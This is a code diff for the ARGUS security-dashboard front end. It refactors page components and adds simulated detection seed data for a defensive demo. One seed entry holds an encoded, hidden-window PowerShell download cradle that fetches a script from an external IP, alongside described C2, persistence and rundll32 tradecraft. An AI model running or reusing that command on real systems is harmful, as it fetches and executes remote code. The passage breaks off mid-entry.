@@ -17,7 +17,7 @@ import {
 } from 'lucide-react';
 import { useProcessMonitor, type RealProcessEvent, type RealProcessInfo } from '@/hooks/use-process-monitor';
 import { useAutonomousDemo, DEMO_STEP, DEMO_DASHBOARD_DURATION_MS, type AutonomousDemoState, type DemoRunState } from '@/hooks/use-autonomous-demo';
-import { useDetections, type DetectionStatus } from '@/hooks/use-detections';
+import { useDetections, type DetectionStatus, type Detection } from '@/hooks/use-detections';
 import { useTelemetryStream } from '@/hooks/use-telemetry-stream';
 import { useNetworkMonitor, type RealNetworkConnection, type RealNetworkSnapshot } from '@/hooks/use-network-monitor';
 import { useNetworkTopology, type NetworkTopologyData, type TopologyConnection } from '@/hooks/use-network-topology';
@@ -50,6 +50,9 @@ import ReportsPage from '@/pages/reports-page';
 import HistoryPage from '@/pages/history-page';
 import CyberCellPage from '@/pages/cyber-cell-page';
 import BacktraceInvestigationPage from '@/pages/backtrace-investigation-page';
+import AutoRemediationPage from '@/pages/auto-remediation-page';
+import { ThreatsPage } from '@/pages/threats-page';
+import { DashboardPage } from '@/pages/dashboard-page';
 import { useQuarantine } from '@/hooks/use-quarantine';
 import { useReports } from '@/hooks/use-reports';
 
@@ -114,7 +117,7 @@ const containmentQuarantineItems: QuarantineItem[] = [
 
 const navGroups: Array<{ label: string; items: Array<[string, string, typeof Activity]> }> = [
   { label: 'Observe', items: [
-    ['/dashboard', 'Dashboard', LayoutDashboard], ['/threats', 'Threats', ShieldAlert], ['/detections', 'Detections', ShieldCheck], ['/monitoring', 'Monitoring', Activity],
+    ['/dashboard', 'Dashboard', LayoutDashboard], ['/threats', 'Threats', ShieldAlert], ['/auto-remediation', 'Auto Remediation', Zap], ['/detections', 'Detections', ShieldCheck], ['/monitoring', 'Monitoring', Activity],
     ['/processes', 'Processes', TerminalSquare], ['/files', 'Files', FileSearch],     ['/network', 'Network Universe', Network],
   ]},
   { label: 'Investigate', items: [
@@ -199,7 +202,7 @@ function Sidebar({ location, open, onClose, onLogout, userName, monitorConnected
     <div className="brand"><div className="brand-mark"><Radar size={17} /></div><div><div className="brand-word">ARGUS</div><div className="brand-sub">SECURITY INTELLIGENCE</div></div><button className="btn btn-ghost mobile-only" style={{ marginLeft: 'auto', padding: 4 }} onClick={onClose} data-testid="button-close-nav"><X size={16} /></button></div>
     <div style={{ padding: '0 12px' }}><div className={cn('badge', monitorConnected ? 'badge-low' : 'badge-muted')} style={{ width: '100%', justifyContent: 'center', padding: '7px' }}><span className="event-dot" style={{ width: 5, height: 5, minWidth: 5, margin: 0, background: monitorConnected ? 'hsl(var(--accent))' : 'hsl(var(--muted-foreground))', boxShadow: 'none' }} />&nbsp; {monitorConnected ? 'SENSOR NETWORK OPERATIONAL' : 'SENSOR NETWORK STANDBY'}</div></div>
     <nav style={{ padding: '4px 12px', overflow: 'auto' }}>
-      {navGroups.map((group) => <div key={group.label}><div className="nav-section">{group.label}</div>{group.items.map(([href, label, Icon]) => <Link href={href} key={href} className={cn('nav-item', location === href ? 'active' : '')} onClick={onClose} data-testid={`link-nav-${label.toLowerCase().replace(/ /g, '-')}`}><IconLabel icon={Icon as typeof Activity}>{label}</IconLabel>{href === '/threats' && <span style={{ marginLeft: 'auto', font: '10px var(--app-font-mono)', color: 'hsl(var(--destructive))' }}>{String(threatCount).padStart(2, '0')}</span>}{href === '/detections' && <span style={{ marginLeft: 'auto', font: '10px var(--app-font-mono)', color: 'hsl(var(--primary))' }}>{String(detectionCount).padStart(2, '0')}</span>}</Link>)}</div>)}
+      {navGroups.map((group) => <div key={group.label}><div className="nav-section">{group.label}</div>{group.items.map(([href, label, Icon]) => <Link href={href} key={href} className={cn('nav-item', location === href ? 'active' : '')} onClick={onClose} data-testid={`link-nav-${label.toLowerCase().replace(/ /g, '-')}`}><IconLabel icon={Icon as typeof Activity}>{label}</IconLabel>{href === '/threats' && <span style={{ marginLeft: 'auto', font: '10px var(--app-font-mono)', color: 'hsl(var(--destructive))' }}>{String(threatCount).padStart(2, '0')}</span>}{href === '/detections' && <span style={{ marginLeft: 'auto', font: '10px var(--app-font-mono)', color: 'hsl(var(--primary))' }}>{String(detectionCount).padStart(2, '0')}</span>}{href === '/auto-remediation' && <span style={{ marginLeft: 'auto', font: '9px var(--app-font-mono)', padding: '1px 5px', borderRadius: 3, background: 'hsl(38 90% 15%)', color: 'hsl(38 92% 50%)', border: '1px solid hsl(38 90% 30%)' }}>AUTO</span>}</Link>)}</div>)}
     </nav>
     <div className="sidebar-footer"><Link href="/settings" className="nav-item" data-testid="link-nav-settings"><IconLabel icon={Settings2}>Settings</IconLabel></Link><Link href="/about" className="nav-item" data-testid="link-nav-about"><IconLabel icon={CircleHelp}>About ARGUS</IconLabel></Link><div className="user-chip"><div className="avatar">{initials}</div><div style={{ minWidth: 0 }}><div style={{ fontSize: 11, fontWeight: 700 }}>{userName || 'Investigator'}</div><div className="mono muted">Lead investigator</div></div><button type="button" className="btn btn-ghost" style={{ marginLeft: 'auto', padding: 4 }} onClick={onLogout} title="Log out" data-testid="button-logout" aria-label="Log out"><LogOut size={13} /></button></div></div>
   </aside>;
@@ -223,82 +226,11 @@ function LiveClock() {
   return <>{label}</>;
 }
 
-function Dashboard({ phase, demoState, demo, startDemo, pauseDemo, resumeDemo, toast, telemetry, processMonitor, userName, threatAnalysis }: { phase: number; demoState: DemoRunState; demo: AutonomousDemoState; startDemo: () => void; pauseDemo: () => void; resumeDemo: () => void; toast: (title: string, body: string) => void; telemetry: ReturnType<typeof useTelemetryStream>; processMonitor: ReturnType<typeof useProcessMonitor>; userName: string; threatAnalysis: ReturnType<typeof useThreatAnalysis> }) {
-  const refreshLabel = formatDashboardClock(new Date());
-  const operator = userName.trim() || 'Investigator';
-  const greeting = `${greetingForHour(new Date().getHours())}, ${operator}.`;
-  const risk = phase >= 5 ? 86 : phase >= 3 ? 61 : 38;
-  const incidentStatus = phase >= 8 ? 'Contained' : phase >= 7 ? 'Detected' : phase >= 5 ? 'Assessing' : 'Monitoring';
-  const demoLabel = demoState === 'paused' ? 'Paused' : demoState === 'completed' ? 'Completed' : demoState === 'running' ? 'Running' : null;
-  const autonomous = demo.demoMode;
-  const autonomousDashboard = autonomous && demo.demoStep === DEMO_STEP.DASHBOARD;
-  const isFresh = telemetry.lastUpdateTime
-    ? Math.abs(Date.now() - new Date(telemetry.lastUpdateTime).getTime()) < 30000
-    : false;
-  const hostOnline = (telemetry.connected || isFresh || Boolean(processMonitor.hasData)) && telemetry.telemetry != null;
-  const t = telemetry.telemetry;
-  const realEvents = processMonitor.events.filter((e) => e.event_type !== 'SNAPSHOT');
-  const realStreamActive = processMonitor.connected && processMonitor.hasData;
-  const heartbeatLabel = telemetry.lastUpdateTime ? `Last heartbeat ${fmtTime(telemetry.lastUpdateTime)}` : 'Last heartbeat 12 sec ago';
-  return <div className="animate-page-enter">
-    <PageHeading eyebrow={<LiveClock />} title={greeting} subtitle="The workspace is watching 24 endpoints across the Northstar environment." actions={<><Button icon={RefreshCw} onClick={() => toast('Workspace refreshed', `Sensor snapshots are current as of ${refreshLabel}.`)} testId="button-refresh-dashboard">Refresh</Button><Button icon={Play} kind="primary" onClick={startDemo} testId="button-start-demo">{autonomous ? 'Stop Demo' : phase >= 8 ? 'Reset Demo' : demoState === 'paused' ? 'Resume Demo' : 'Start Demo Mode'}</Button></>} />
-    <div className="scan-strip" data-testid={autonomousDashboard ? 'dashboard-demo-strip' : undefined}><div className="scan-status"><span className={cn('event-dot', autonomousDashboard && 'animate-pulse-line')} style={{ margin: 0, background: autonomousDashboard ? 'hsl(var(--primary))' : phase >= 8 ? 'hsl(var(--accent))' : demoState === 'paused' ? 'hsl(var(--chart-3))' : 'hsl(var(--primary))' }} /><div>{autonomousDashboard ? <span key={demo.demoStatusLabel}>Autonomous demo · <span className="incident-card-enter" key={demo.demoStatusLabel}>{demo.demoStatusLabel}</span></span> : phase ? <span key={incidentStatus}>Synthetic incident · <span className="incident-card-enter" key={incidentStatus}>{incidentStatus}</span></span> : 'No active simulation'}<br /><small>{autonomousDashboard ? `Threat detection in ${demo.demoRemainingSeconds}s · endpoint WS-0427${demoLabel ? ` · ${demoLabel}` : ''}` : phase ? `Sequence ${Math.min(phase, 8)} of 8 · endpoint WS-0427${demoLabel ? ` · ${demoLabel}` : ''}` : 'Start Demo Mode to walk through an end-to-end exposure story.'}</small></div></div><div className="actions" style={{ position: 'relative', zIndex: 1 }}>{demoState === 'running' && <Button icon={Pause} onClick={pauseDemo} testId="button-pause-demo">Pause</Button>}{demoState === 'paused' && <Button icon={Play} kind="primary" onClick={resumeDemo} testId="button-resume-demo">Resume</Button>}{demoState === 'completed' && <span className="mono muted" data-testid="text-demo-completed">Completed</span>}<Link href="/exposure" className="btn" data-testid="link-view-assessment">View assessment <ArrowRight size={13} /></Link></div>{autonomousDashboard && <div className="demo-progress" data-testid="demo-dashboard-progress"><i style={{ width: `${Math.min(100, Math.max(0, (1 - demo.demoRemainingSeconds / (DEMO_DASHBOARD_DURATION_MS / 1000)) * 100))}%` }} /></div>}</div>
-    <div className="grid metrics"><StatCard label="Protection score" value="94.8%" note="+2.6% from previous window" tone="good" icon={ShieldCheck} /><StatCard label="Active incidents" value={threatAnalysis.isLive ? String(threatAnalysis.threatCount) : phase >= 7 ? '01' : '02'} note={threatAnalysis.isLive ? `${threatAnalysis.criticalCount} critical · ${threatAnalysis.highCount} high › live detections` : phase >= 7 ? '1 awaiting containment' : '1 critical · 1 medium'} tone={threatAnalysis.isLive ? (threatAnalysis.criticalCount > 0 ? 'danger' : 'warn') : phase >= 7 ? 'danger' : 'warn'} icon={ShieldAlert} /><StatCard label="Endpoints online" value={hostOnline ? '1 / 1' : '24 / 24'} note={hostOnline ? `This host · ${heartbeatLabel.toLowerCase()}` : heartbeatLabel} tone="good" icon={Laptop} /><StatCard label="Exposure risk" value={`${risk}/100`} note={phase ? 'Synthetic incident in progress' : 'Within monitored baseline'} tone={risk > 70 ? 'danger' : 'warn'} icon={Activity} /></div>
-    {hostOnline
-      ? <Card className="card-pad" style={{ marginTop: 14 }} data-testid="dashboard-real-telemetry"><PanelTitle title="This host · real Windows telemetry" detail="PSUTIL · LIVE" action={<span className="badge badge-low" style={{ background: 'hsl(142 71% 20%)', color: 'hsl(142 71% 70%)', border: '1px solid hsl(142 71% 30%)' }}><Radio size={10} style={{ marginRight: 4, verticalAlign: 'middle' }} />REAL WINDOWS TELEMETRY</span>} /><div className="grid metrics" style={{ gridTemplateColumns: 'repeat(4,1fr)' }}>
-        <StatCard label="CPU" value={t?.cpu?.percent != null ? `${t.cpu.percent.toFixed(1)}%` : '—'} note={t?.cpu?.count != null ? `${t.cpu.count} cores` : '—'} tone="info" icon={Cpu} />
-        <StatCard label="Memory" value={t?.memory?.percent != null ? `${t.memory.percent.toFixed(1)}%` : '—'} note={fmtBytes(t?.memory?.used_bytes) + ' used'} tone="good" icon={Database} />
-        <StatCard label="Processes" value={t?.processes?.running != null ? String(t.processes.running) : '—'} note="running" tone="good" icon={TerminalSquare} />
-        <StatCard label="Uptime" value={fmtUptime(t?.system?.uptime_seconds)} note={`updated ${fmtTime(telemetry.lastUpdateTime ?? undefined)}`} tone="good" icon={Clock3} />
-      </div></Card>
-      : <div className="scan-strip" style={{ marginTop: 14, background: 'hsl(var(--muted))' }} data-testid="dashboard-telemetry-offline"><div className="scan-status" style={{ color: 'hsl(var(--muted-foreground))' }}><AlertTriangle size={15} /><div><b>MONITORING ENGINE OFFLINE</b><small> · Start the ARGUS security engine and API server to stream real Windows telemetry to the dashboard.</small></div></div></div>}
-    <div className="grid dash-grid" style={{ marginTop: 14 }}>
-      <Card className="card-pad"><PanelTitle title="Protection signal" detail="24H · ALL ENDPOINTS" /><div style={{ height: 190, position: 'relative' }}><LiveChart value={94.8 - (phase ? Math.min(phase * 2.4, 24) : 0)} label="signal integrity" max={100} format={(n) => `${n.toFixed(1)}%`} color="primary" height={160} /></div><div style={{ display: 'flex', gap: 22, marginTop: 17, fontSize: 10 }}><span><i className="event-dot" style={{ display: 'inline-block', margin: '0 6px 1px 0' }} />Signal integrity</span><span className="muted">Baseline confidence <b style={{ color: 'hsl(var(--foreground))' }}>98.2%</b></span></div></Card>
-      <Card className="card-pad"><PanelTitle title="Live event stream" detail={realStreamActive ? 'REAL PROCESS EVENTS' : 'AUTO-REFRESH 12s'} action={<Link href="/monitoring" className="mono" style={{ color: 'hsl(var(--primary))', textDecoration: 'none' }} data-testid="link-live-stream">Open stream</Link>} />{(realStreamActive && realEvents.length > 0
-        ? realEvents.slice(-4).reverse().map((event) => <div className="event-row" key={event.id}><span className="event-dot" style={event.event_type === 'PROCESS_STARTED' ? { background: 'hsl(var(--accent))' } : { background: 'hsl(var(--destructive))' }} /><div className="event-copy"><div>{event.event_type === 'PROCESS_STARTED' ? 'Process started' : 'Process terminated'}</div><div className="muted" style={{ fontSize: 10, marginTop: 2 }}><span className="mono">{event.process_name}</span> · PID {event.pid}{event.parent_process_name ? ` · ${event.parent_process_name}` : ''} · this host</div></div><span className="event-time">{new Date(event.timestamp).toLocaleTimeString()}</span></div>)
-        : (phase ? timelineSeed.slice(Math.max(0, phase - 3), phase + 1).reverse() : timelineSeed.slice(0, 4)).map((event) => <div className="event-row" key={event.id}><span className="event-dot" style={event.status === 'potential' ? { background: 'hsl(var(--chart-3))', boxShadow: '0 0 0 3px hsl(var(--chart-3)/.1)' } : {}} /><div className="event-copy"><div>{event.title}</div><div className="muted" style={{ fontSize: 10, marginTop: 2 }}>{event.category} · WS-0427</div></div><span className="event-time">{event.time}</span></div>))}</Card>
-      <Card className="wide"><div className="card-pad"><PanelTitle title="Recent incidents" detail={threatAnalysis.isLive ? 'REAL-TIME DETECTIONS' : 'LAST 7 DAYS'} action={<Link href="/threats" className="btn btn-ghost btn-sm" data-testid="link-all-incidents">View all <ArrowRight size={12} /></Link>} /><div className="table-wrap"><table className="data-table"><thead><tr><th>Incident</th><th>Severity</th><th>Endpoint</th><th>Observed</th><th>Risk</th><th>Status</th></tr></thead><tbody>{threatAnalysis.isLive && threatAnalysis.threatCount > 0 ? threatAnalysis.threats.slice(0, 3).map((t) => (
-          <tr key={t.id}><td><b>{t.name}</b><div className="muted mono">{t.id} · {t.className}{t.source === 'live' ? ' · LIVE' : ''}</div></td><td><Badge value={t.severity} /></td><td className="mono">WS-0427 · This host</td><td className="mono">{t.timestamp.includes('T') ? new Date(t.timestamp).toLocaleTimeString() : t.timestamp}</td><td><div style={{ width: 88 }}><div className="risk-meter">{[1, 2, 3, 4, 5].map((n) => <i className={n <= Math.ceil((t.severity === 'critical' ? 100 : t.severity === 'high' ? 80 : t.severity === 'medium' ? 60 : 20) / 20) ? 'on' : ''} key={n} />)}</div></div></td><td><StateBadge value={t.status} /></td></tr>
-        )) : (
-          <><tr><td><b>Suspicious PowerShell execution</b><div className="muted mono">INC-2024-1042 · Command & Control</div></td><td><Badge value="critical" /></td><td className="mono">WS-0427 · Mira Alvarez</td><td className="mono">09:42:18</td><td><div style={{ width: 88 }}><div className="risk-meter">{[1, 2, 3, 4, 5].map((n) => <i className={n <= Math.ceil(risk / 20) ? 'on' : ''} key={n} />)}</div></div></td><td><Badge value={incidentStatus.toLowerCase()} /></td></tr><tr><td><b>Unsigned binary in user profile</b><div className="muted mono">INC-2024-1039 · Execution</div></td><td><Badge value="medium" /></td><td className="mono">WS-0198 · Theo Bennett</td><td className="mono">Yesterday 18:14</td><td><div style={{ width: 88 }}><div className="risk-meter">{[1, 2, 3, 4, 5].map((n) => <i className={n <= 3 ? 'on' : ''} key={n} />)}</div></div></td><td><Badge value="contained" /></td></tr></>
-        )}</tbody></table></div></div></Card>
-      <Card className="card-pad"><PanelTitle title="Threat intelligence" detail="CURATED SIGNALS" /><div className="event-row"><div className="avatar" style={{ borderRadius: 5 }}><Globe2 size={14} /></div><div className="event-copy"><b>cdn-sync-check[.]com</b><div className="muted">Newly registered · 3 feeds agree</div></div><Badge value="high" /></div><div className="event-row"><div className="avatar" style={{ borderRadius: 5 }}><Fingerprint size={14} /></div><div className="event-copy"><b>Hash a7f1…92c4</b><div className="muted">No prior internal sightings</div></div><Badge value="medium" /></div><Link href="/intelligence" className="btn btn-ghost btn-sm" style={{ marginTop: 12, paddingLeft: 0 }} data-testid="link-intelligence-dashboard">Open intelligence panel <ArrowRight size={12} /></Link></Card>
-      <Card className="card-pad"><PanelTitle title="Sensor health" detail="LAST HEARTBEAT" />{hostOnline ? <><div style={{ display: 'flex', alignItems: 'center', gap: 15, marginBottom: 14 }}><div style={{ fontSize: 31, fontWeight: 800, letterSpacing: '-.06em' }}>100%</div><div className="signal-good" style={{ fontSize: 11 }}>This host streaming</div></div><div className="progress"><i style={{ width: '100%', background: 'hsl(var(--accent))' }} /></div><div className="kpi-line"><span className="muted">Toolchain</span><b className="mono">psutil · SSE</b></div><div className="kpi-line"><span className="muted">Process events</span><b className="mono">{processMonitor.eventCount}</b></div><div className="kpi-line"><span className="muted">Mean heartbeat</span><b className="mono">{heartbeatLabel.replace('Last heartbeat ', '')}</b></div></> : <><div style={{ display: 'flex', alignItems: 'center', gap: 15, marginBottom: 14 }}><div style={{ fontSize: 31, fontWeight: 800, letterSpacing: '-.06em' }}>100%</div><div className="signal-good" style={{ fontSize: 11 }}>All agents reporting</div></div><div className="progress"><i style={{ width: '100%', background: 'hsl(var(--accent))' }} /></div><div className="kpi-line"><span className="muted">Windows endpoints</span><b>18</b></div><div className="kpi-line"><span className="muted">macOS endpoints</span><b>6</b></div><div className="kpi-line"><span className="muted">Mean heartbeat</span><b className="mono">12 sec</b></div></>}</Card>
-    </div>
-  </div>;
-}
+// Dashboard extracted to @/pages/dashboard-page
 
-function ThreatsPage({ threats, onContain, toast, setModal, setLocation, threatAnalysis, demoReached = false }: { threats: Threat[]; onContain: (id: string) => void; toast: (t: string, b: string) => void; setModal: (m: ModalState) => void; setLocation: (path: string) => void; threatAnalysis: ReturnType<typeof useThreatAnalysis>; demoReached?: boolean }) {
-  const [query, setQuery] = useState(''); const [severity, setSeverity] = useState('all');
-  const { isLive, scanStatus, scanProgress, scanPhaseLabel, scanItemsChecked, scanFindingsFound, runScan } = threatAnalysis;
-  const liveThreats = threatAnalysis.threats;
-  const allThreats = isLive && liveThreats.length > 0 ? liveThreats.map((t) => ({
-    ...t,
-    timestamp: /T\d{2}:/.test(t.timestamp) ? new Date(t.timestamp).toLocaleTimeString() : t.timestamp,
-  })) as Threat[] : threats;
-  const filtered = allThreats.filter((t) => `${t.name} ${t.path} ${t.process} ${t.hash}`.toLowerCase().includes(query.toLowerCase()) && (severity === 'all' || t.severity === severity));
-  const detectionLabel = isLive ? 'Real-time detections · live engine' : 'Detection center · 02 requiring review';
-  const subtitleLabel = isLive ? `${liveThreats.length} threats detected from live process and network analysis.` : 'Triage observed signals before they become a defensible incident narrative.';
-  return <div className="animate-rise"><PageHeading eyebrow={detectionLabel} title="Threat detections" subtitle={subtitleLabel} actions={<>{isLive && <span className="badge badge-low" style={{ background: 'hsl(142 71% 20%)', color: 'hsl(142 71% 70%)', border: '1px solid hsl(142 71% 30%)' }}><Radio size={10} style={{ marginRight: 4, verticalAlign: 'middle' }} />REAL-TIME</span>}<Button onClick={() => runScan('Quick')} icon={Zap} testId="button-quick-scan">Quick scan</Button><Button onClick={() => runScan('Full')} icon={Radar} kind="primary" testId="button-full-scan">Full scan</Button><Button onClick={() => runScan('Custom')} icon={SlidersHorizontal} testId="button-custom-scan">Custom</Button></>} />
-    {demoReached && <div className="scan-strip" data-testid="threats-demo-reached"><div className="scan-status"><Radar size={15} /><div>Reached via autonomous demo<small> · ARGUS transitioned here automatically after the 10-second dashboard presentation. Threat triage is back under your control.</small></div></div></div>}
-    {!isLive && <div className="scan-strip" style={{ background: 'hsl(var(--muted))' }} data-testid="threats-offline-banner"><div className="scan-status" style={{ color: 'hsl(var(--muted-foreground))' }}><AlertTriangle size={15} /><div><b>DEMO DATA</b><small> · Start the ARGUS security engine to enable real-time threat detection from live process and network telemetry.</small></div></div></div>}
-    {scanStatus === 'scanning' && <Card className="card-pad" style={{ marginBottom: 14, border: '1px solid hsl(var(--primary)/.3)', background: 'linear-gradient(90deg,rgba(71,215,239,.06),rgba(71,215,239,.02))' }}>
-      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
-        <div style={{ display: 'flex', alignItems: 'center', gap: 9 }}>
-          <RefreshCw size={15} className="animate-pulse-line" style={{ color: 'hsl(var(--primary))' }} />
-          <span className="scan-phase">{scanPhaseLabel}</span>
-        </div>
-        <span className="mono muted">{scanProgress}%</span>
-      </div>
-      <div className="scan-progress-bar"><div style={{ width: `${scanProgress}%` }} /></div>
-      <div className="scan-findings-live" style={{ marginTop: 8 }}>
-        <span>Items checked: <b>{scanItemsChecked}</b></span>
-        <span>Findings: <b style={{ color: scanFindingsFound > 0 ? 'hsl(var(--destructive))' : 'hsl(var(--accent))' }}>{scanFindingsFound}</b></span>
-        {isLive && <span>Source: <b>Live engine</b></span>}
-      </div>
-    </Card>}
-    {scanStatus === 'complete' && scanFindingsFound > 0 && <div className="scan-strip" style={{ marginBottom: 14 }}><div className="scan-status"><ShieldAlert size={15} /><div>{scanFindingsFound} new finding{scanFindingsFound > 1 ? 's' : ''} discovered<small> · review the updated detection list below</small></div></div></div>}<div className="filterbar"><div className="search-wrap"><Search size={14} /><input className="search" value={query} onChange={(e) => setQuery(e.target.value)} placeholder="Search detections, paths, processes, hashes" data-testid="input-search-threats" /></div><select className="select" value={severity} onChange={(e) => setSeverity(e.target.value)} data-testid="select-severity"><option value="all">All severities</option><option value="critical">Critical</option><option value="high">High</option><option value="medium">Medium</option><option value="low">Low</option></select><span className="mono muted">{filtered.length} of {allThreats.length} detections</span></div><Card><div className="table-wrap"><table className="data-table" style={{ minWidth: 1180 }}><thead><tr><th>Detection</th><th>Severity</th><th>Observed</th><th>Process / path</th><th>SHA-256</th><th>Reason</th><th>Status</th><th /></tr></thead><tbody>{filtered.map((t) => <tr key={t.id} style={demoReached && t.severity === 'critical' ? { background: 'hsl(var(--primary)/.07)' } : undefined}><td><b>{t.name}</b><div className="muted mono">{t.id} · {t.className}</div></td><td><Badge value={t.severity} /></td><td className="mono">{t.timestamp}</td><td><div className="mono">{t.process}</div><div className="muted mono" style={{ maxWidth: 220, overflow: 'hidden', textOverflow: 'ellipsis' }}>{t.path}</div></td><td className="mono" data-testid={`text-hash-${t.id}`}>{shortHash(t.hash)}</td><td style={{ maxWidth: 200, whiteSpace: 'normal', lineHeight: 1.4 }}>{t.reason}</td><td><StateBadge value={t.status} /></td><td><div className="actions"><Button kind="ghost" icon={Eye} onClick={() => { const route = investigateRouteForThreat(t); toast('Investigation opened', `${t.name} · hash ${shortHash(t.hash)}`); setLocation(route); }} testId={`button-investigate-${t.id}`}>Investigate</Button>{t.status === 'detected' && <Button kind="danger" icon={Shield} onClick={() => setModal({ title: 'Contain this endpoint?', body: 'ARGUS will isolate WS-0427 from the network and suspend the associated process. Quarantine inventory will update. This is reversible.', confirm: 'Contain endpoint', onConfirm: () => onContain(t.id) })} testId={`button-contain-${t.id}`}>Contain</Button>}</div></td></tr>)}</tbody></table>{!filtered.length && <div className="empty"><Search size={22} /><h3>No detections match</h3><p>Try clearing the filter or searching a process name.</p></div>}</div></Card></div>;
-}
+
+// ThreatsPage extracted to @/pages/threats-page
+
 
 function fmtBytes(bytes?: number): string {
   if (bytes == null) return '—';
@@ -356,29 +288,207 @@ function DetectionLifecycle({ status, onChange, testPrefix }: { status: Detectio
   })}</div>;
 }
 
+const simulatedDetectionsSeed: Detection[] = [
+  {
+    id: 'sim-det-1',
+    rule_id: 'PROC-002-ENCODED-COMMAND-LINE',
+    rule_name: 'Encoded or obfuscated command line',
+    title: 'powershell.exe executed with Base64 encoded payload',
+    explanation: 'powershell.exe (pid 8412) was invoked with an encoded script block (-enc / -EncodedCommand) designed to hide C2 staging logic from endpoint auditing logs.',
+    recommended_action: 'Decode and inspect the Base64 script payload. Isolate the host WS-0427 from the internal network and revoke any active credentials associated with this session.',
+    severity: 'critical',
+    confidence: 0.92,
+    status: 'detected',
+    entity: 'powershell.exe',
+    pid: 8412,
+    executable_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+    command_line: 'powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADQANQAuADEANQA0AC4AMgA1ADUALgA4ADgAOgA4ADAAOAAwAC8AYgAuAHAAcwAxACcAKQA=',
+    parent_pid: 6230,
+    parent_process_name: 'cmd.exe',
+    username: 'SYSTEM',
+    hostname: 'WS-0427',
+    timestamp: new Date(Date.now() - 14 * 60 * 1000).toISOString(),
+    evidence: [
+      { key: 'encoded_marker', description: 'Base64 encoded parameter (-enc) detected in command line invocation', source: 'command_line', detail: '-enc SQBFAFgAKABOAGUAdwAt...' },
+      { key: 'decoded_cradle', description: 'Decodes to IEX (New-Object Net.WebClient).DownloadString(\'http://45.154.255.88:8080/b.ps1\')', source: 'deobfuscation', detail: 'External C2 staging endpoint' },
+    ],
+    correlated_rules: ['PROC-001-SUSPICIOUS-PARENT-CHILD', 'PROC-002-ENCODED-COMMAND-LINE', 'PROC-006-DOWNLOAD-EXECUTE'],
+    ancestry: [
+      { pid: 4100, process_name: 'explorer.exe', executable_path: 'C:\\Windows\\explorer.exe', command_line: null, username: 'nikhil' },
+      { pid: 6230, process_name: 'cmd.exe', executable_path: 'C:\\Windows\\System32\\cmd.exe', command_line: 'cmd.exe /c start', username: 'nikhil' },
+      { pid: 8412, process_name: 'powershell.exe', executable_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', command_line: 'powershell.exe -NoP -NonI -W Hidden -enc ...', username: 'nikhil' }
+    ]
+  },
+  {
+    id: 'sim-det-2',
+    rule_id: 'NET-001-USER-WRITABLE-OUTBOUND',
+    rule_name: 'Outbound network I/O from a user-writable binary',
+    title: 'svchost_update.exe opened outbound C2 channel to 45.154.255.88:4444',
+    explanation: 'svchost_update.exe (pid 9344) established an active TCP connection to 45.154.255.88 on port 4444 from a user-writable Temp directory (C:\\Users\\nikhi\\AppData\\Local\\Temp\\).',
+    recommended_action: 'Block outbound traffic to 45.154.255.88 immediately at the firewall. Terminate pid 9344 and purge all binary artifacts in AppData\\Local\\Temp.',
+    severity: 'critical',
+    confidence: 0.89,
+    status: 'investigated',
+    entity: 'svchost_update.exe',
+    pid: 9344,
+    executable_path: 'C:\\Users\\nikhi\\AppData\\Local\\Temp\\svchost_update.exe',
+    command_line: 'C:\\Users\\nikhi\\AppData\\Local\\Temp\\svchost_update.exe --connect',
+    parent_pid: 8412,
+    parent_process_name: 'powershell.exe',
+    username: 'nikhil',
+    hostname: 'WS-0427',
+    timestamp: new Date(Date.now() - 10 * 60 * 1000).toISOString(),
+    evidence: [
+      { key: 'writable_path', description: 'Binary executes from user-writable Temp directory', source: 'path', detail: 'C:\\Users\\nikhi\\AppData\\Local\\Temp\\svchost_update.exe' },
+      { key: 'c2_socket', description: 'Established TCP socket to 45.154.255.88:4444', source: 'network', detail: '10.102.49.157:51280 -> 45.154.255.88:4444 (ESTABLISHED)' }
+    ],
+    correlated_rules: ['NET-001-USER-WRITABLE-OUTBOUND', 'NET-002-KNOWN-TOOL-PORT'],
+    ancestry: [
+      { pid: 8412, process_name: 'powershell.exe', executable_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', command_line: null, username: 'nikhil' },
+      { pid: 9344, process_name: 'svchost_update.exe', executable_path: 'C:\\Users\\nikhi\\AppData\\Local\\Temp\\svchost_update.exe', command_line: null, username: 'nikhil' }
+    ]
+  },
+  {
+    id: 'sim-det-3',
+    rule_id: 'FILE-001-STARTUP-PERSISTENCE',
+    rule_name: 'Persistent payload in a Windows Startup folder',
+    title: 'Persistence script written to Windows Startup directory',
+    explanation: 'A script file (win_sync.bat) was created in the Windows Startup directory to achieve persistence across user logons and system reboots.',
+    recommended_action: 'Quarantine C:\\Users\\nikhi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\win_sync.bat and audit related scheduled tasks.',
+    severity: 'high',
+    confidence: 0.86,
+    status: 'detected',
+    entity: 'win_sync.bat',
+    pid: 9344,
+    executable_path: 'C:\\Users\\nikhi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\win_sync.bat',
+    command_line: null,
+    parent_pid: null,
+    parent_process_name: null,
+    username: 'nikhil',
+    hostname: 'WS-0427',
+    timestamp: new Date(Date.now() - 6 * 60 * 1000).toISOString(),
+    evidence: [
+      { key: 'startup_location', description: 'File placed in per-user Startup directory', source: 'filesystem', detail: 'C:\\Users\\nikhi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' },
+      { key: 'auto_execution', description: 'Batch script executes automatically upon user authentication', source: 'persistence', detail: 'Calls dropped payload svchost_update.exe' }
+    ],
+    correlated_rules: ['FILE-001-STARTUP-PERSISTENCE'],
+    ancestry: []
+  },
+  {
+    id: 'sim-det-4',
+    rule_id: 'PROC-007-LOLBIN-EXECUTION',
+    rule_name: 'Living-off-the-land binary use',
+    title: 'rundll32.exe executed unbacked DLL entrypoint',
+    explanation: 'rundll32.exe was executed targeting an unbacked DLL artifact in the Temp directory with ordinal export parameter.',
+    recommended_action: 'Terminate rundll32.exe process tree and collect memory dump for malware analysis.',
+    severity: 'high',
+    confidence: 0.81,
